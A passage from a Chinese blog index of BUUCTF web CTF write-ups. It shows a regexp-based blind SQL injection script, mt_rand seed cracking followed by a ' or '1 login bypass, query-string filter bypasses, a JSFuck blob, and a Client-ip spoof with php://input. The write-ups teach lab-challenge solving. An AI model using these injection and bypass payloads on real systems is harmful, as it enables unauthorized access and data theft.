passwd=&apos;&apos;我们通过username 传入 \\ 这样可以把&apos;转义掉 变成这样select * from users where username=&apos;\\&apos; and passwd=&apos;&apos;此时的 \\&apos; and passwd=&apos; 就成了 username的值在通过传入 passwd 传入 ||passwd/**/regexp&quot;^y&quot;;%00select * from users where username=&apos;\\&apos; and passwd=&apos;||passwd/**/regexp&quot;^y&quot;;%00&apos;就和前置知识类似了select * from users where username=&apos;&apos;||passwd/**/regexp&quot;^y&quot;;%00&apos; 后边的%00相当于截断了后边的字符，看了下php 对应版本为 5.2.16,存在截断漏洞，接下来只需要遍历 regexp&quot;^x&quot; 中的 x即可\n\npython写脚本import requestsfrom urllib import parseurl = \"http://08df778b-b131-45e7-9eff-822311e44b07.node4.buuoj.cn:81/\"# 构造字典dict_list = [ i for i in range(97,123)]shuzi = [i for i in range(48,58)]dict_list +=shuzidict_list.append(95)flag = ''for i in range(50):    for j in dict_list:        payload = '||passwd/**/regexp\"^%s\";\\x00'%(flag+chr(j))        datas = &#123;            'username': '\\\\',            'passwd': payload        &#125;        print(datas)        import time        time.sleep(1)        res = requests.post(url=url,data=datas)        # print(res.text)        if 'welcome.php' in res.text :            flag += chr(j)            print(\"[+] \"+flag)            break\n\n容易跑到一半就报错，直接把得到的结果手动拼上去继续跑\n\n得到\nyou_will_never_know7788990\n\n提交\nusername=&amp;passwd=you_will_never_know7788990\n\n\n总结这道题，又让我学到了sql注入的一种新姿势。\n","categories":["CTF","BUUCTF"],"tags":["CTF","SQL注入(regexp注入)"]},{"title":"BUUCTF-WEB [MRCTF2020]Ezaudit 1","url":"/2021/10/28/%5BMRCTF2020%5DEzaudit%201/","content":"考点文件泄露\nmt_srand伪随机数构造\nsql注入\n解题过程打开\n扫目录扫到www.zip，压缩包中有一个index.php文件，代码如下\n&lt;?php header('Content-type:text/html; charset=utf-8');error_reporting(0);if(isset($_POST['login']))&#123;    $username = $_POST['username'];    $password = $_POST['password'];    $Private_key = $_POST['Private_key'];    if (($username == '') || ($password == '') ||($Private_key == '')) &#123;        // 若为空,视为未填写,提示错误,并3秒后返回登录界面        header('refresh:2; url=login.html');        echo \"用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!\";        exit;&#125;\t// KVQP0LdJKRaV    else if($Private_key != '*************' )    &#123;        header('refresh:2; url=login.html');        echo \"假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!\";        exit;    &#125;    else&#123;        if($Private_key === '************')&#123;        $getuser = \"SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'\".';';\t\t// $getuser = \"SELECT flag FROM user WHERE username= 'crispr' AND password = '1'or '1'\".';';        $link=mysql_connect(\"localhost\",\"root\",\"root\");        mysql_select_db(\"test\",$link);        $result = mysql_query($getuser);        while($row=mysql_fetch_assoc($result))&#123;            echo \"&lt;tr&gt;&lt;td&gt;\".$row[\"username\"].\"&lt;/td&gt;&lt;td&gt;\".$row[\"flag\"].\"&lt;/td&gt;&lt;td&gt;\";        &#125;    &#125;    &#125;&#125; // genarate public_key function public_key($length = 16) &#123;    $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';    $public_key = '';    for ( $i = 0; $i &lt; $length; $i++ )\t// mt_srand(xxx);  1775196155\t// 这里的mt_rand会根据mt_srand设置的随机数种子来生成随机数\t// 如果我们知道了 xxx 我们就掌握了随机数的生成规律    $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);    return $public_key;\t// 返回结果：KVQP0LdJKRaV3n9D\t// 这里通过返回结果反推出随机数  &#125;  //genarate private_key  function private_key($length = 12) &#123;    $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';    $private_key = '';    for ( $i = 0; $i &lt; $length; $i++ )    $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);    return $private_key;  &#125;  $Public_key = public_key();  //$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???\n\n将公钥转换成随机数生成的数字import requestsimport randomdict1='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'dict2='KVQP0LdJKRaV3n9D'dict3 = dict1[::-1]     length = len(dict2)    res=''for i in range(len(dict2)):    for j in range(len(dict1)):        if dict2[i] == dict1[j]:            res+=str(j)+' '+str(j)+' '+'0'+' '+str(len(dict1)-1)+' '            breakprint(res)\n\n得到\n36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61\n\n通过php_mt_seed爆破出随机数种子\n得到\n1775196155\n\n设置mt_srand值为1775196155&lt;?phpmt_srand(1775196155);function public_key($length = 16) &#123;    $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';    $public_key = '';    for ( $i = 0; $i &lt; $length; $i++ )        // mt_srand(xxx);  1775196155        // 这里的mt_rand会根据mt_srand设置的随机数种子来生成随机数        // 如果我们知道了 xxx 我们就掌握了随机数的生成规律        $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);    return $public_key;    // 返回结果：KVQP0LdJKRaV3n9D    // 这里通过返回结果反推出随机数&#125;function private_key($length = 12) &#123;    $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';    $private_key = '';    for ( $i = 0; $i &lt; $length; $i++ )        $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);    return $private_key;&#125;echo public_key().\"\\n\";echo private_key();\n\n得到\nKVQP0LdJKRaV3n9DXuNhoueCDCGc\n\n拿到了Private_key，接下来就是提交\n\"SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'\".';';\"SELECT flag FROM user WHERE username= 'crispr' AND password = '1'or '1'\".';'; // 绕过即可\n\npost\nlogin=123&amp;username=aaa&amp;password=1&apos; or &apos;1&amp;Private_key=XuNhoueCDCGc\n\n\n总结老考点，不是很难。\n","categories":["CTF","BUUCTF"],"tags":["CTF","文件泄露","mt_srand伪随机数构造","sql绕过"]},{"title":"BUUCTF-WEB 【MRCTF2020】套娃 1","url":"/2021/04/22/%5BMRCTF2020%5D%E5%A5%97%E5%A8%83%201/","content":"考点：代码审计和字符绕过打开一个平淡无奇的页面，查看源代码，得到一串代码\n//1st# 拿到?后面的字符串$query = $_SERVER['QUERY_STRING']; if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 )&#123;    die('Y0u are So cutE!');&#125; if($_GET['b_u_p_t'] !== '23333' &amp;&amp; preg_match('/^23333$/', $_GET['b_u_p_t']))&#123;    echo \"you are going to the next ~\";&#125;\n\n经过分析，需要绕过两个条件\n第一个  $query 中不能存在 _ %5f \nif( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 )\n\n第二个 $_GET[‘b_u_p_t’] 不能为 23333  用正常匹配 又必须为 23333\nif($_GET['b_u_p_t'] !== '23333' &amp;&amp; preg_match('/^23333$/', $_GET['b_u_p_t']))\n\n绕过方式\n?b.u.p.t=23333%0a?b%20u%20p%20t=23333%0a\n\n%20 . 用于绕过 _ ，%0a 绕过 正则首尾固定匹配。\n回显\n\n访问\n\n源代码\n\n[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][[]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[!+[]+!+[]]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]]((+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+[+!+[]])+(![]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]])()())[!+[]+!+[]+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+[+!+[]])+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+([+[]]+![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+[]]])\n\n得到一串有规律的字符，放入控制台。\n\n弹出 post me Merak\nPOST:Merak=1\n\n回显了源代码\n&lt;?php error_reporting(0); include 'takeip.php';ini_set('open_basedir','.'); include 'flag.php';if(isset($_POST['Merak']))&#123;     highlight_file(__FILE__);     die(); &#125; function change($v)&#123;     $v = base64_decode($v);     $re = '';     for($i=0;$i&lt;strlen($v);$i++)&#123;         $re .= chr ( ord ($v[$i]) + $i*2 );     &#125;     return $re; &#125;echo 'Local access only!'.\"&lt;br/&gt;\";$ip = getIp();if($ip!='127.0.0.1')echo \"Sorry,you don't have permission!  Your ip is :\".$ip;if($ip === '127.0.0.1' &amp;&amp; file_get_contents($_GET['2333']) === 'todat is a happy day' )&#123;echo \"Your REQUEST is:\".change($_GET['file']);echo file_get_contents(change($_GET['file'])); &#125;?&gt;\n\n可以通过file_get_contents 来读取flag。\n有两个条件 和 一个函数对输入内容进行处理\nif($ip === '127.0.0.1' &amp;&amp; file_get_contents($_GET['2333']) === 'todat is a happy day' )\n\n访问ip为 127.0.0.1\nfile_get_contents($_GET[‘2333’]) 读取的内容 为’todat is a happy day’\n绕过的方式都很简单\n构造header头Client-ip: 127.0.0.1\n\nGET:?2333=php://inputPOST:todat is a happy day\n\n接下来就是 反转对输入内容的处理\n这个函数会将输入的字符进行base64解码，进行遍历，将每个字符转换成ascii码 + 当前位置2，在转换成字符。比如 ok，会将 o 转换成ascii码 111，再将 `111+12，就会得到113，再转换为字符q。kascii则是107，107+2*2=111，就会为o`。\nfunction change($v)&#123;     $v = base64_decode($v);     $re = '';     for($i=0;$i&lt;strlen($v);$i++)&#123;         $re .= chr ( ord ($v[$i]) + $i*2 );     &#125;     return $re; &#125;\n\n写了一段反转的代码\nfunction change2($v)&#123;    $re = '';    # 遍历字符串    for($i=0;$i&lt;strlen($v);$i++)&#123;        # 将字符转换为ascii码值 + 当前字符下标的两倍//        $re .= chr ( ord ($v[$i]) + $i*2 ); 0=&gt;0 1=&gt;2 2=&gt;4        $re .= chr(ord($v[$i]) - $i*2);     &#125;    $v = base64_encode($re);    return $v;&#125;echo change2('flag.php');// 得到 ZmpdYSZmXGI=\n\n最后\nGET:?2333=php://input&amp;file=ZmpdYSZmXGI=POST:todat is a happy day\n\n构造header头Client-ip: 127.0.0.1\n\n请求\n\n\n","categories":["CTF","BUUCTF"],"tags":["代码审计","CTF"]},{"title":"BUUCTF-WEB 【NPUCTF2020】ReadlezPHP 1","url":"/2021/04/16/%5BNPUCTF2020%5DReadlezPHP%201/","content":"反序列化和代码执行&lt;?php#error_reporting(0);class 